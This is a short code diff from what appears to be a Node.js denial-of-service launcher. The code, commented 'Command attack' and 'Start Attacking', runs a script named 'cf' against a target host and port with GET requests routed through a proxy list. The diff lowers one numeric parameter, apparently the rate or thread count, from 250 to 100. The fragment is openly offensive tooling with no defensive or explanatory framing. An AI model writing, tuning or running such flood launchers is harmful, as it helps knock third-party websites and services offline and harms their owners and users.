@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} 250 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
+exec(`node cf ${host} ${port} 100 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
